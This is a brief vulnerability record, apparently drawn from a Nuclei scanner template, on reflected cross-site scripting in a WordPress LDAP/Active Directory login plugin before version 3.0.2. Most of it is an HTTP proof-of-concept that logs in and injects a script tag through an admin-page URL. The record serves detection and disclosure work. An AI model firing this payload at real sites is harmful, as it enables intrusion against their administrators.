# Vulnerability: Ldap WP Login / Active Directory Integration < 3.0.2 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`ldap-wp-login-xss.yaml`)

## Description
The plugin does not escape generated URLs before outputing them in attrubutes, leading to Reflected Cross-Site Scripting

## Secure Mitigation
Fixed in version 3.0.2

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=LDAP+authentication+intergrating+with+AD&a"><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}
```

